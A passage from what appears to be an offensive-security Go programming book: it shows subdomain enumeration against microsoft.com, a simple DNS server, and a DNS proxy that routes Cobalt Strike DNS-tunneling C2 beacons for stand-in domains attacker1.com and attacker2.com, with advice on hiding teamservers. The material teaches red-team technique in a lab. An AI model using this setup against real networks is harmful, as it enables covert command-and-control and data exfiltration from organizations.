<pre>$ <span class="codestrong1">wc -l namelist.txt</span>&#13;
1909 namelist.txt&#13;
$ <span class="codestrong1">time ./subdomain_guesser -domain microsoft.com -wordlist namelist.txt -c 1000</span>&#13;
ajax.microsoft.com            72.21.81.200&#13;
buy.microsoft.com             157.56.65.82&#13;
news.microsoft.com            192.230.67.121&#13;
applications.microsoft.com    168.62.185.179&#13;
sc.microsoft.com              157.55.99.181&#13;
open.microsoft.com            23.99.65.65&#13;
ra.microsoft.com              131.107.98.31&#13;
ris.microsoft.com             213.199.139.250&#13;
smtp.microsoft.com            205.248.106.64&#13;
wallet.microsoft.com          40.86.87.229&#13;
jp.microsoft.com              134.170.185.46&#13;
ftp.microsoft.com             134.170.188.232&#13;
develop.microsoft.com         104.43.195.251&#13;
./subdomain_guesser -domain microsoft.com -wordlist namelist.txt -c 1000 0.23s user 0.67s system 22% cpu 4.040 total</pre>&#13;
<p class="indent">You’ll see that the output shows several FQDNs and their IP addresses. We were able to guess the subdomain values for each result based off the word list provided as an input file.</p>&#13;
<p class="indent">Now that you’ve built your own subdomain-guessing tool and learned how to resolve hostnames and IP addresses to enumerate different DNS records, you’re ready to write your own DNS server and proxy.</p>&#13;
<h3 class="h3" id="ch5lev1sec2">Writing DNS Servers</h3>&#13;
<p class="noindent">As Yoda said, “Always two there are, no more, no less.” Of course, he was talking about the client-server relationship, and since you’re a master of clients, now is the time to become a master of servers. In this section, you’ll use the Go DNS package to write a basic server and a proxy. You can use DNS servers for several nefarious activities, including but not limited to tunneling out of restrictive networks and conducting spoofing attacks by using fake wireless access points.</p>&#13;
<p class="indent">Before you begin, you’ll need to set up a lab environment. This lab environment will allow you to simulate realistic scenarios without having to own legitimate domains and use costly infrastructure, but if you’d like to register domains and use a real server, please feel free to do so.</p>&#13;
<h4 class="h4" id="ch5lev2sec4"><span epub:type="pagebreak" id="page_118"/>Lab Setup and Server Introduction</h4>&#13;
<p class="noindent">Your lab consists of two virtual machines (VMs): a Microsoft Windows VM to act as client and an Ubuntu VM to act as server. This example uses VMWare Workstation along with Bridged network mode for each machine; you can use a private virtual network, but make sure that both machines are on the same network. Your server will run two Cobalt Strike Docker instances built from the official Java Docker image (Java is a prerequisite for Cobalt Strike). <a href="ch05.xhtml#ch5fig1">Figure 5-1</a> shows what your lab will look like.</p>&#13;
<div class="image"><img src="Images/05fig01.jpg" alt="Image" width="926" height="282"/></div>&#13;
<p class="figcap" id="ch5fig1"><em>Figure 5-1: The lab setup for creating your DNS server</em></p>&#13;
<p class="indent">First, create the Ubuntu VM. To do this, we’ll use version 16.04.1 LTS. No special considerations need to be made, but you should configure the VM with at least 4 gigabytes of memory and two CPUs. You can use an existing VM or host if you have one. After the operating system has been installed, you’ll want to install a Go development environment (see <a href="ch01.xhtml#ch1">Chapter 1</a>).</p>&#13;
<p class="indent">Once you’ve created the Ubuntu VM, install a virtualization container utility called <em>Docker</em>. In the proxy section of this chapter, you’ll use Docker to run multiple instances of Cobalt Strike. To install Docker, run the following in your terminal window:</p>&#13;
<pre>$ <span class="codestrong1">sudo</span> <span class="codestrong1">apt-get install apt-transport-https ca-certificates</span>&#13;
sudo apt-key adv \&#13;
               --keyserver hkp://ha.pool.sks-keyservers.net:80 \&#13;
               --recv-keys 58118E89F3A912897C070ADBF76221572C52609D&#13;
$ <span class="codestrong1">echo</span> <span class="codestrong1">"deb https://apt.dockerproject.org/repo ubuntu-xenial main" | sudo tee</span>&#13;
<span class="codestrong1">/etc/apt/sources.list.d/docker.list</span>&#13;
$ <span class="codestrong1">sudo apt-get update</span>&#13;
$ <span class="codestrong1">sudo apt-get install linux-image-extra-$(uname -r) linux-image-extra-virtual</span>&#13;
$ <span class="codestrong1">sudo apt-get install docker-engine</span>&#13;
$ <span class="codestrong1">sudo service docker start</span>&#13;
$ <span class="codestrong1">sudo usermod -aG docker</span> <span class="codeitalicst">USERNAME</span></pre>&#13;
<p class="indent">After installing, log out and log back into your system. Next, verify that Docker has been installed by running the following command:</p>&#13;
<pre>$ <span class="codestrong1">docker version</span>&#13;
Client:&#13;
 Version:      1.13.1&#13;
 API version:  1.26&#13;
<span epub:type="pagebreak" id="page_119"/> Go version:   go1.7.5&#13;
 Git commit:   092cba3&#13;
 Built:        Wed Feb  5 06:50:14 2020&#13;
 OS/Arch:      linux/amd64</pre>&#13;
<p class="indent">With Docker installed, use the following command to download a Java image. This command pulls down the base Docker Java image but doesn’t create any containers. You’re doing this to prepare for your Cobalt Strike builds shortly.</p>&#13;
<pre>$ <span class="codestrong1">docker pull java</span></pre>&#13;
<p class="indent">Finally, you need to ensure that <code>dnsmasq</code> isn’t running, because it listens on port 53. Otherwise, your own DNS servers won’t be able to operate, since they’re expected to use the same port. Kill the process by ID if it’s running:</p>&#13;
<pre>$ <span class="codestrong1">ps -ef | grep dnsmasq</span>&#13;
nobody    <span class="codestrong1">3386</span>  2020  0 12:08&#13;
$ <span class="codestrong1">sudo kill 3386</span></pre>&#13;
<p class="indent">Now create a Windows VM. Again, you can use an existing machine if available. You don’t need any special settings; minimal settings will do. Once the system is functional, set the DNS server to the IP address of the Ubuntu system.</p>&#13;
<p class="indent">To test your lab setup and to introduce you to writing DNS servers, start by writing a basic server that returns only A records. In your <code>GOPATH</code> on the Ubuntu system, create a new directory called <em>github.com/blackhat-go/bhg/ch-5/a_server</em> and a file to hold your <em>main.go</em> code. <a href="ch05.xhtml#ch5list5">Listing 5-5</a> shows the entire code for creating a simple DNS server.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "log"&#13;
    "net"&#13;
&#13;
    "github.com/miekg/dns"&#13;
)&#13;
&#13;
func main() {&#13;
 <span class="ent">❶</span> dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {&#13;
     <span class="ent">❷</span> var resp dns.Msg&#13;
        resp.SetReply(req)&#13;
        for _, q := range req.Question {&#13;
         <span class="ent">❸</span> a := dns.A{&#13;
                Hdr: dns.RR_Header{&#13;
                    Name:   q.Name,&#13;
                    Rrtype: dns.TypeA,&#13;
                    Class:  dns.ClassINET,&#13;
                    Ttl:    0,&#13;
                },&#13;
                A: net.ParseIP("127.0.0.1").To4(),&#13;
<span epub:type="pagebreak" id="page_120"/>            }&#13;
        <span class="ent">❹</span> resp.Answer = append(resp.Answer, &amp;a)&#13;
        }&#13;
     <span class="ent">❺</span> w.WriteMsg(&amp;resp)&#13;
    })&#13;
 <span class="ent">❻</span> log.Fatal(dns.ListenAndServe(":53", "udp", nil))&#13;
}</pre>&#13;
<p class="caption" id="ch5list5"><em>Listing 5-5: Writing a DNS server (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-5/a_server/main.go">/ch-5/a_server/main.go</a><em>)</em></p>&#13;
<p class="indent">The server code starts with a call to <code>HandleFunc()</code> <span class="ent">❶</span>; it looks a lot like the <code>net/http</code> package. The function’s first argument is a query pattern to match. You’ll use this pattern to indicate to the DNS servers which requests will be handled by the supplied function. By using a period, you’re telling the server that the function you supply in the second argument will handle all requests.</p>&#13;
<p class="indent">The next argument passed to <code>HandleFunc()</code> is a function containing the logic for the handler. This function receives two arguments: a <code>ResponseWriter</code> and the request itself. Inside the handler, you start by creating a new message and setting the reply <span class="ent">❷</span>. Next, you create an answer for each question, using an A record, which implements the <code>RR</code> interface. This portion will vary depending on the type of answer you’re looking for <span class="ent">❸</span>. The pointer to the A record is appended to the response’s <code>Answer</code> field by using <code>append()</code> <span class="ent">❹</span>. With the response complete, you can write this message to the calling client by using <code>w.WriteMsg()</code> <span class="ent">❺</span>. Finally, to start the server, <code>ListenAndServe()</code> is called <span class="ent">❻</span>. This code resolves all requests to an IP address of 127.0.0.1.</p>&#13;
<p class="indent">Once the server is compiled and started, you can test it by using <code>dig</code>. Confirm that the hostname for which you’re querying resolves to 127.0.0.1. That indicates it’s working as designed.</p>&#13;
<pre>$ <span class="codestrong1">dig @localhost facebook.com</span>&#13;
&#13;
; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Ubuntu &lt;&lt;&gt;&gt; @localhost facebook.com&#13;
; (1 server found)&#13;
;; global options: +cmd&#13;
;; Got answer:&#13;
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 33594&#13;
;; flags: qr rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0&#13;
;; WARNING: recursion requested but not available&#13;
&#13;
;; QUESTION SECTION:&#13;
;facebook.com.                   IN        A&#13;
&#13;
;; ANSWER SECTION:&#13;
facebook.com.             0      IN        A      127.0.0.1&#13;
&#13;
;; Query time: 0 msec&#13;
;; SERVER: 127.0.0.1#53(127.0.0.1)&#13;
;; WHEN: Sat Dec 19 13:13:45 MST 2020&#13;
;; MSG SIZE  rcvd: 58</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_121"/>Note that the server will need to be started with sudo or a root account, because it listens on a privileged port—port 53. If the server doesn’t start, you may need to kill <code>dnsmasq</code>.</p>&#13;
<h4 class="h4" id="ch5lev2sec5">Creating DNS Server and Proxy</h4>&#13;
<p class="noindent"><em>DNS tunneling</em>, a data exfiltration technique, can be a great way to establish a C2 channel out of networks with restrictive egress controls. If using an authoritative DNS server, an attacker can route through an organization’s own DNS servers and out through the internet without having to make a direct connection to their own infrastructure. Although slow, it’s difficult to defend against. Several open source and proprietary payloads perform DNS tunneling, one of which is Cobalt Strike’s Beacon. In this section, you’ll write your own DNS server and proxy and learn how to multiplex DNS tunneling C2 payloads by using Cobalt Strike.</p>&#13;
<h5 class="h5">Configuring Cobalt Strike</h5>&#13;
<p class="noindent">If you’ve ever used Cobalt Strike, you may have noticed that, by default, the <em>teamserver</em> listens on port 53. Because of this, and by the recommendation of the documentation, only a single server should ever be run on a system, maintaining a one-to-one ratio. This can become problematic for medium-to-large teams. For example, if you have 20 teams conducting offensive engagements against 20 separate organizations, standing up 20 systems capable of running the teamserver could be difficult. This problem isn’t unique to Cobalt Strike and DNS; it’s applicable to other protocols, including HTTP payloads, such as Metasploit Meterpreter and Empire. Although you could establish listeners on a variety of completely unique ports, there’s a greater probability of egressing traffic over common ports such as TCP 80 and 443. So the question becomes, how can you and other teams share a single port and route to multiple listeners? The answer is with a proxy, of course. Back to the lab.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>In real engagements, you’d want to have multiple levels of subterfuge, abstraction, and forwarding to disguise the location of your teamserver. This can be done using UDP and TCP forwarding through small utility servers using various hosting providers. The primary teamserver and proxy can also run on separate systems, having the teamserver cluster on a large system with plenty of RAM and CPU power.</em></p>&#13;
</div>&#13;
<p class="indent">Let’s run two instances of Cobalt Strike’s teamserver in two Docker containers. This allows the server to listen on port 53 and lets each teamserver have what will effectively be their own system and, consequently, their own IP stack. You’ll use Docker’s built-in networking mechanism to map UDP ports to the host from the container. Before you begin, download a trial version of Cobalt Strike at <em><a href="https://trial.cobaltstrike.com/">https://trial.cobaltstrike.com/</a></em>. After following the trial sign-up instructions, you should have a fresh <em>tarball</em> in your download directory. You’re now ready to start the teamservers.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_122"/>Execute the following in a terminal window to start the first container:</p>&#13;
<pre>$ <span class="codestrong1">docker run --rm</span><span class="ent">❶</span> <span class="codestrong1">-it</span><span class="ent">❷</span> <span class="codestrong1">-p 2020:53</span><span class="ent">❸</span> <span class="codestrong1">-p 50051:50050</span><span class="ent">❹</span> <span class="codestrong1">-v</span><span class="ent">❺</span> <span class="codeitalicst">full path to</span>&#13;
<span class="codeitalicst">cobalt strike download</span><span class="codestrong1">:/data</span><span class="ent">❻</span> <span class="codestrong1">java</span><span class="ent">❼</span> <span class="codestrong1">/bin/bash</span><span class="ent">❽</span></pre>&#13;
<p class="indent">This command does several things. First, you tell Docker to remove the container after it exits <span class="ent">❶</span>, and that you’d like to interact with it after starting <span class="ent">❷</span>. Next, you map port 2020 on your host system to port 53 in the container <span class="ent">❸</span>, and port 50051 to port 50050 <span class="ent">❹</span>. Next, you map the directory containing the Cobalt Strike tarball <span class="ent">❺</span> to the data directory on the container <span class="ent">❻</span>. You can specify any directory you want and Docker will happily create it for you. Finally, provide the image you want to use (in this case, Java) <span class="ent">❼</span> and the command <span class="ent">❽</span> you’d like to execute on startup. This should leave you with a bash shell in the running Docker container.</p>&#13;
<p class="indent">Once inside the Docker container, start the teamserver by executing the following commands:</p>&#13;
<pre>$ <span class="codestrong1">cd /root</span>&#13;
$ <span class="codestrong1">tar -zxvf /data/cobaltstrike-trial.tgz</span>&#13;
$ <span class="codestrong1">cd cobaltstrike</span>&#13;
$ <span class="codestrong1">./teamserver</span> <span class="codeitalicst">&lt;IP address of host&gt; &lt;some password&gt;</span></pre>&#13;
<p class="indent">The IP address provided should be that of your actual VM, not the IP address of the container.</p>&#13;
<p class="indent">Next, open a new terminal window on the Ubuntu host and change into the directory containing the Cobalt Strike tarball. Execute the following commands to install Java and start the Cobalt Strike client:</p>&#13;
<pre>$ <span class="codestrong1">sudo add-apt-repository ppa:webupd8team/java</span>&#13;
$ <span class="codestrong1">sudo apt update</span>&#13;
$ <span class="codestrong1">sudo apt install oracle-java8-installer</span>&#13;
$ <span class="codestrong1">tar -zxvf cobaltstrike-trial.tgz</span>&#13;
$ <span class="codestrong1">cd cobaltstrike</span>&#13;
$ <span class="codestrong1">./cobaltstrike</span></pre>&#13;
<p class="indent">The GUI for Cobalt Strike should start up. After clearing the trial message, change the teamserver port to 50051 and set your username and password accordingly.</p>&#13;
<p class="indent">You’ve successfully started and connected to a server running completely in Docker! Now, let’s start a second server by repeating the same process. Follow the previous steps to start a new teamserver. This time, you’ll map different ports. Incrementing the ports by one should do the trick and is logical. In a new terminal window, execute the following command to start a new container and listen on ports 2021 and 50052:</p>&#13;
<pre>$ <span class="codestrong1">docker run --rm -it -p 2021:53 -p 50052:50050-v</span> <span class="codeitalicst">full path to cobalt strike</span>&#13;
<span class="codeitalicst">download</span><span class="codestrong1">:/data java /bin/bash</span></pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_123"/>From the Cobalt Strike client, create a new connection by selecting <strong>Cobalt Strike</strong> ▶ <strong>New Connection</strong>, modifying the port to 50052, and selecting <strong>Connect</strong>. Once connected, you should see two tabs at the bottom of the console, which you can use to switch between servers.</p>&#13;
<p class="indent">Now that you’ve successfully connected to the two teamservers, you should start two DNS listeners. To create a listener, select <strong>Configure Listeners</strong> from the menu; its icon looks like a pair of headphones. Once there, select <strong>Add</strong> from the bottom menu to bring up the New Listener window. Enter the following information:</p>&#13;
<ul>&#13;
<li><p class="noindenta">Name: <span class="codestrong">DNS 1</span></p></li>&#13;
<li><p class="noindenta">Payload: <span class="codestrong">windows/beacon_dns/reverse_dns_txt</span></p></li>&#13;
<li><p class="noindenta">Host: <span class="codeitalicB">&lt;IP address of host&gt;</span></p></li>&#13;
<li><p class="noindenta">Port: <span class="codestrong">0</span></p></li>&#13;
</ul>&#13;
<p class="indent">In this example, the port is set to 80, but your DNS payload still uses port 53, so don’t worry. Port 80 is specifically used for hybrid payloads. <a href="ch05.xhtml#ch5fig2">Figure 5-2</a> shows the New Listener window and the information you should be entering.</p>&#13;
<div class="image"><img src="Images/05fig02.jpg" alt="Image" width="926" height="524"/></div>&#13;
<p class="figcap" id="ch5fig2"><em>Figure 5-2: Adding a new listener</em></p>&#13;
<p class="indent">Next, you’ll be prompted to enter the domains to use for beaconing, as shown in <a href="ch05.xhtml#ch5fig3">Figure 5-3</a>.</p>&#13;
<p class="indent">Enter the domain <em>attacker1.com</em> as the DNS beacon, which should be the domain name to which your payload beacons. You should see a message indicating that a new listener has started. Repeat the process within the other teamserver, using DNS 2 and <em>attacker2.com</em>. Before you start using these two listeners, you’ll need to write an intermediary server that inspects the DNS messages and routes them appropriately. This, essentially, is your proxy.</p>&#13;
<div class="image"><img src="Images/05fig03.jpg" alt="Image" width="926" height="530"/></div>&#13;
<p class="figcap" id="ch5fig3"><span epub:type="pagebreak" id="page_124"/><em>Figure 5-3: Adding the DNS beacon’s domain</em></p>&#13;
<h5 class="h5">Creating a DNS Proxy</h5>&#13;
<p class="noindent">The DNS package you’ve been using throughout this chapter makes writing an intermediary function easy, and you’ve already used some of these functions in previous sections. Your proxy needs to be able to do the following:</p>&#13;
<ul>&#13;
<li><p class="noindenta">Create a handler function to ingest an incoming query</p></li>&#13;
<li><p class="noindenta">Inspect the question in the query and extract the domain name</p></li>&#13;
<li><p class="noindenta">Identify the upstream DNS server correlating to the domain name</p></li>&#13;
<li><p class="noindenta">Exchange the question with the upstream DNS server and write the response to the client</p></li>&#13;
</ul>&#13;
<p class="indent">Your handler function could be written to handle <em>attacker1.com</em> and <em>attacker2.com</em> as static values, but that’s not maintainable. Instead, you should look up records from a resource external to the program, such as a database or a configuration file. The following code does this by using the format of <code>domain,server</code>, which lists the incoming domain and upstream server separated by a comma. To start your program, create a function that parses a file containing records in this format. The code in <a href="ch05.xhtml#ch5list6">Listing 5-6</a> should be written into a new file called <em>main.go</em>.</p>&#13;
<pre>   package main&#13;
&#13;
   import (&#13;
       "bufio"&#13;
       "fmt"&#13;
       "os"&#13;
       "strings"&#13;
   )&#13;
&#13;
<span epub:type="pagebreak" id="page_125"/><span class="ent">❶</span> func parse(filename string) (map[string]string<span class="ent">❷</span>, error) {&#13;
       records := make(map[string]string)&#13;
       fh, err := os.Open(filename)&#13;
       if err != nil {&#13;
           return records, err&#13;
       }&#13;
       defer fh.Close()&#13;
       scanner := bufio.NewScanner(fh)&#13;
       for scanner.Scan() {&#13;
           line := scanner.Text()&#13;
           parts := strings.SplitN(line, ",", 2)&#13;
           if len(parts) &lt; 2 {&#13;
               return records, fmt.Errorf("%s is not a valid line", line)&#13;
           }&#13;
           records[parts[0]] = parts[1]&#13;
       }&#13;
       return records, scanner.Err()&#13;
   }&#13;
&#13;
   func main() {&#13;
       records, err := parse("proxy.config")&#13;
       if err != nil {&#13;
           panic(err)&#13;
       }&#13;
       fmt.Printf("%+v\n", records)&#13;
   }</pre>&#13;
<p class="caption" id="ch5list6"><em>Listing 5-6: Writing a DNS proxy (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-5/dns_proxy/main.go">/ch-5/dns_proxy/main.go</a><em>)</em></p>&#13;
<p class="indent">With this code, you first define a function <span class="ent">❶</span> that parses a file containing the configuration information and returns a <code>map[string]string</code> <span class="ent">❷</span>. You’ll use that map to look up the incoming domain and retrieve the upstream server.</p>&#13;
<p class="indent">Enter the first command in the following code into your terminal window, which will write the string after <code>echo</code> into a file called <em>proxy.config</em>. Next, you should compile and execute <em>dns_proxy.go</em>.</p>&#13;
<pre>$ <span class="codestrong1">echo 'attacker1.com,127.0.0.1:2020\nattacker2.com,127.0.0.1:2021' &gt; proxy.config</span>&#13;
$ <span class="codestrong1">go build</span>&#13;
$ <span class="codestrong1">./dns_proxy</span>&#13;
map[attacker1.com:127.0.0.1:2020 attacker2.com:127.0.0.1:2021]</pre>&#13;
<p class="indent">What are you looking at here? The output is the mapping between teamserver domain names and the port on which the Cobalt Strike DNS server is listening. Recall that you mapped ports 2020 and 2021 to port 53 on your two separate Docker containers. This is a quick and dirty way for you to create basic configuration for your tool so you don’t have to store it in a database or other persistent storage mechanism.</p>&#13;
<p class="indent">With a map of records defined, you can now write the handler function. Let’s refine your code, adding the following to your <code>main()</code> function. It should follow the parsing of your config file.</p>&#13;
<pre><span epub:type="pagebreak" id="page_126"/><span class="ent">❶</span> dns.HandleFunc(".",func(w dns.ResponseWriter, req *dns.Msg)<span class="ent">❷</span> {&#13;
    <span class="ent">❸</span> if len(req.Question) &lt; 1 {&#13;
           dns.HandleFailed(w, req)&#13;
           return&#13;
       }&#13;
    <span class="ent">❹</span> name := req.Question[0].Name&#13;
       parts := strings.Split(name, ".")&#13;
       if len(parts) &gt; 1 {&#13;
        <span class="ent">❺</span> name = strings.Join(parts[len(parts)-2:], ".")&#13;
       }&#13;
    <span class="ent">❻</span> match, ok:= records[name]&#13;
       if !ok {&#13;
           dns.HandleFailed(w, req)&#13;
           return&#13;
       }&#13;
    <span class="ent">❼</span> resp, err := dns.Exchange(req, match)&#13;
       if err != nil {&#13;
           dns.HandleFailed(w, req)&#13;
           return&#13;
       }&#13;
    <span class="ent">❽</span> if err := w.WriteMsg(resp); err != nil {&#13;
           dns.HandleFailed(w, req)&#13;
           return&#13;
       }&#13;
   })&#13;
<span class="ent">❾</span> log.Fatal(dns.ListenAndServe(":53", "udp", nil))</pre>&#13;
<p class="indent">To begin, call <code>HandleFunc()</code> with a period to handle all incoming requests <span class="ent">❶</span>, and define an <em>anonymous function</em> <span class="ent">❷</span>, which is a function that you don’t intend to reuse (it has no name). This is good design when you have no intention to reuse a block of code. If you intend to reuse it, you should declare and call it as a <em>named function</em>. Next, inspect the incoming questions slice to ensure that at least one question is provided <span class="ent">❸</span>, and if not, call <code>HandleFailed()</code> and return to exit the function early. This is a pattern used throughout the handler. If at least a single question does exist, you can safely pull the requested name from the first question <span class="ent">❹</span>. Splitting the name by a period is necessary to extract the domain name. Splitting the name should never result in a value less than 1, but you should check it to be safe. You can grab the <em>tail</em> of the slice—the elements at the end of the slice—by using the <span class="codeitalic">slice</span> operator on the slice <span class="ent">❺</span>. Now, you need to retrieve the upstream server from the records map.</p>&#13;
<p class="indent">Retrieving a value from a map <span class="ent">❻</span> can return one or two variables. If the key (in our case, a domain name) is present on the map, it will return the corresponding value. If the domain isn’t present, it will return an empty string. You could check if the returned value is an empty string, but that would be inefficient when you start working with types that are more complex. Instead, assign two variables: the first is the value for the key, and the second is a Boolean that returns <code>true</code> if the key is found. After ensuring a match, you can exchange the request with the upstream server <span class="ent">❼</span>. You’re simply making sure that the domain name for which you’ve received the <span epub:type="pagebreak" id="page_127"/>request is configured in your persistent storage. Next, write the response from the upstream server to the client <span class="ent">❽</span>. With the handler function defined, you can start the server <span class="ent">❾</span>. Finally, you can now build and start the proxy.</p>&#13;
<p class="indent">With the proxy running, you can test it by using the two Cobalt Strike listeners. To do this, first create two stageless executables. From Cobalt Strike’s top menu, click the icon that looks like a gear, and then change the output to <strong>Windows Exe</strong>. Repeat this process from each teamserver. Copy each of these executables to your Windows VM and execute them. The DNS server of your Windows VM should be the IP address of your Linux host. Otherwise, the test won’t work.</p>&#13;
<p class="indent">It may take a moment or two, but eventually you should see a new beacon on each teamserver. Mission accomplished!</p>&#13;
<h5 class="h5">Finishing Touches</h5>&#13;
<p class="noindent">This is great, but when you have to change the IP address of your teamserver or redirector, or if you have to add a record, you’ll have to restart the server as well. Your beacons would likely survive such an action, but why take the risk when there’s a much better option? You can use process signals to tell your running program that it needs to reload the configuration file. This is a trick that I first learned from Matt Holt, who implemented it in the great Caddy Server. <a href="ch05.xhtml#ch5list7">Listing 5-7</a> shows the program in its entirety, complete with process signaling logic:</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "bufio"&#13;
    "fmt"&#13;
    "log"&#13;
    "os"&#13;
    "os/signal"&#13;
    "strings"&#13;
    "sync"&#13;
    "syscall"&#13;
&#13;
    "github.com/miekg/dns"&#13;
)&#13;
&#13;
func parse(filename string) (map[string]string, error) {&#13;
    records := make(map[string]string)&#13;
    fh, err := os.Open(filename)&#13;
    if err != nil {&#13;
        return records, err&#13;
    }&#13;
    defer fh.Close()&#13;
    scanner := bufio.NewScanner(fh)&#13;
    for scanner.Scan() {&#13;
        line := scanner.Text()&#13;
        parts := strings.SplitN(line, ",", 2)&#13;
<span epub:type="pagebreak" id="page_128"/>        if len(parts) &lt; 2 {&#13;
            return records, fmt.Errorf("%s is not a valid line", line)&#13;
        }&#13;
        records[parts[0]] = parts[1]&#13;
    }&#13;
    log.Println("records set to:")&#13;
    for k, v := range records {&#13;
        fmt.Printf("%s -&gt; %s\n", k, v)&#13;
    }&#13;
    return records, scanner.Err()&#13;
}&#13;
&#13;
func main() {&#13;
 <span class="ent">❶</span> var recordLock sync.RWMutex&#13;
&#13;
    records, err := parse("proxy.config")&#13;
    if err != nil {&#13;
        panic(err)&#13;
    }&#13;
&#13;
    dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {&#13;
        if len(req.Question) == 0 {&#13;
            dns.HandleFailed(w, req)&#13;
            return&#13;
        }&#13;
        fqdn := req.Question[0].Name&#13;
        parts := strings.Split(fqdn, ".")&#13;
        if len(parts) &gt;= 2 {&#13;
            fqdn = strings.Join(parts[len(parts)-2:], ".")&#13;
        }&#13;
     <span class="ent">❷</span> recordLock.RLock()&#13;
        match := records[fqdn]&#13;
     <span class="ent">❸</span> recordLock.RUnlock()&#13;
        if match == "" {&#13;
            dns.HandleFailed(w, req)&#13;
            return&#13;
        }&#13;
        resp, err := dns.Exchange(req, match)&#13;
        if err != nil {&#13;
            dns.HandleFailed(w, req)&#13;
            return&#13;
        }&#13;
        if err := w.WriteMsg(resp); err != nil {&#13;
            dns.HandleFailed(w, req)&#13;
            return&#13;
        }&#13;
    })&#13;
&#13;
 <span class="ent">❹</span> go func() {&#13;
     <span class="ent">❺</span> sigs := make(chan os.Signal, 1)&#13;
     <span class="ent">❻</span> signal.Notify(sigs, syscall.SIGUSR1)&#13;
&#13;
        for sig := range sigs {&#13;
         <span class="ent">❼</span> switch sig {&#13;
<span epub:type="pagebreak" id="page_129"/>            case syscall.SIGUSR1:&#13;
                log.Println("SIGUSR1: reloading records")&#13;
            <span class="ent">❽</span> recordLock.Lock()&#13;
                parse("proxy.config")&#13;
             <span class="ent">❾</span> recordLock.Unlock()&#13;
            }&#13;
        }&#13;
    }()&#13;
&#13;
    log.Fatal(dns.ListenAndServe(":53", "udp", nil))&#13;
}</pre>&#13;
<p class="caption" id="ch5list7"><em>Listing 5-7: Your completed proxy (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-5/dns_proxy/main.go">/ch-5/dns_proxy/main.go</a><em>)</em></p>&#13;
<p class="indent">There are a few additions. Since the program is going to be modifying a map that could be in use by concurrent goroutines, you’ll need to use a mutex to control access.<sup><a id="rch5fn1" href="footnote.xhtml#ch5fn1">1</a></sup> A <em>mutex</em> prevents concurrent execution of sensitive code blocks, allowing you to lock and unlock access. In this case, you can use <code>RWMutex</code> <span class="ent">❶</span>, which allows any goroutine to read without locking the others out, but will lock the others out when a write is occurring. Alternatively, implementing goroutines without a mutex on your resource will introduce interleaving, which could result in race conditions or worse.</p>&#13;
<p class="indent">Before accessing the map in your handler, call <code>RLock</code> <span class="ent">❷</span> to read a value to <code>match</code>; after the read is complete, <code>RUnlock</code> <span class="ent">❸</span> is called to release the map for the next goroutine. In an anonymous function that’s running within a new goroutine <span class="ent">❹</span>, you begin the process of listening for a signal. This is done using a channel of type <code>os.Signal</code> <span class="ent">❺</span>, which is provided in the call to <code>signal.Notify()</code> <span class="ent">❻</span> along with the literal signal to be consumed by the <code>SIGUSR1</code> channel, which is a signal set aside for arbitrary purposes. In a loop over the signals, use a <code>switch</code> statement <span class="ent">❼</span> to identify the type of signal that has been received. You’re configuring only a single signal to be monitored, but in the future you might change this, so this is an appropriate design pattern. Finally, <code>Lock()</code> <span class="ent">❽</span> is used prior to reloading the running configuration to block any goroutines that may be trying to read from the record map. Use <code>Unlock()</code> <span class="ent">❾</span> to continue execution.</p>&#13;
<p class="indent">Let’s test this program by starting the proxy and creating a new listener within an existing teamserver. Use the domain <em>attacker3.com</em>. With the proxy running, modify the <em>proxy.config</em> file and add a new line pointing the domain to your listener. You can signal the process to reload its configuration by using <code>kill</code>, but first use <code>ps</code> and <code>grep</code> to identify the process ID.</p>&#13;
<pre>$  <span class="codestrong1">ps -ef | grep proxy</span>&#13;
$  <span class="codestrong1">kill -10</span> <span class="codeitalicst">PID</span></pre>&#13;
<p class="indent">The proxy should reload. Test it by creating and executing a new stageless executable. The proxy should now be functional and production ready.</p>&#13;
<h3 class="h3" id="ch5lev1sec3"><span epub:type="pagebreak" id="page_130"/>Summary</h3>&#13;
<p class="noindent">Although this concludes the chapter, you still have a world of possibilities for your code. For example, Cobalt Strike can operate in a hybrid fashion, using HTTP and DNS for different operations. To do this, you’ll have to modify your proxy to respond with the listener’s IP for A records; you’ll also need to forward additional ports to your containers. In the next chapter, you’ll delve into the convoluted craziness that is SMB and NTLM. Now, go forth and conquer!</p>&#13;
</div>



  </body></html>